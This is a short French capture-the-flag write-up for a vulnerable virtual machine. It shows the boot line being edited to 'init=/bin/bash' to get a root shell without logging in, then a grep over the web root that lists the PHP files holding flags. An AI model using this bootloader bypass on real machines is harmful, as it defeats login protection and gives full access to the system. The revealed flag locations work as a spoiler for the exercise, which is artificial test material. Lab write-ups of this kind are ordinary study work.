# BIOS BASH

Au démarage de la VM lorsqu'on appui sur TAB cette ligne apparait:
```
> /casper/vmlinuz file=/cdrom/preseed/custom.seed boot=casper initrd=/casper/initrd.gz quiet splash --
```
On peut remplacer le "splash --" par "init=/bin/bash" pour lancer un shell. \
A partir de ce shell on a accès a tous le code source du serveur dans /var/www/html. \
On lance un petit grep pour repérer les fichiers intéressants.
```
> grep -sr "flag is" /var/www/html

/var/www/html/admin/index.php:
 ...
/var/www/html/includes/feedback.inc.php:
 ...
/var/www/html/includes/header.inc.php:
 ...
/var/www/html/includes/media.inc.php:
 ...
/var/www/html/includes/recover.inc.php:
 ...
/var/www/html/includes/signin.inc.php:
 ...
/var/www/html/includes/survey.inc.php:
 ...
/var/www/html/includes/upload.inc.php:
 ...
```
Tous les fichiers listés contiennent un flag.
